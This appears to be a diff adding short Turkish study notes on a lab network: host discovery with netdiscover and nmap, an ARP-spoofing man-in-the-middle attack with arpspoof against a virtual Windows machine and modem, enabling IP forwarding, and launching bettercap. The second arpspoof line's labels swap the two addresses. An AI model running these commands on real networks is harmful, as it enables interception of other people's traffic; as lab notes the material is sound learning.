@@ -1,0 +1,12 @@
+netdiscover -r 10.0.2.0/24 (IP Adreslerini ve Onların MAC Adreslerini bulur.)
+
+nmap 10.0.2.0/24 (normalde parametre verilir üsttekiyle aynı )
+
+Man in the Middle Saldırısı(Hepsi ayrı Komut Satırında)
+arpspoof -i eth0 -t 10.0.2.15(Windows Sanal)  10.0.2.1(Modem)
+arpspoof -i eth0 -t 10.0.2.1(Windows Sanal)  10.0.2.15(Modem)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Bettercap
+apt-get install bettercap
+bettercap -iface eth0(daha sonra Help yazınca menü çıkıyor.)
